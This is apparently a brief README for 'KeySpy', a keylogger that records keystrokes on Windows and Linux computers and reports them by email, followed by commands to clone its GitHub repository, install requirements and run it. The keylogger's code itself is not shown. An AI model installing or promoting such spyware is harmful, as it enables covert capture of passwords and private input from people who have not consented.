**KEYSPY IS A KEYLOGGER PROGRAM THAT RECORDS KEYSTROKES ON A COMPUTER AND REPORT VIA EMAIL ON WINDOWS AND LINUX**

**INSTALLATION**

git clone https://github.com/SoloTech01/KeySpy.git

cd KeySpy

pip install -r requirements.txt

python3 keyspy.py
